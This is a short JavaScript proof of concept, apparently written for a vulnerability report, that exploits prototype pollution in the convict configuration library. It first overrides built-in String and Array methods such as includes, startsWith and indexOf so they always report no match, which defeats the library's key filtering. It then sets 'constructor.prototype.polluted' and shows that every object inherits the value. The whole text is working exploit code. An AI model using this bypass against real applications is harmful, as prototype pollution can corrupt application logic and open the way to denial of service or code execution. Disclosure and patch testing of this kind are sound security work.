String.prototype.includes = () => false;
String.prototype.startsWith = () => false; //this line
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const convict = require('convict');
let obj = {};
const config = convict(obj);
console.log({}.polluted);
config.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);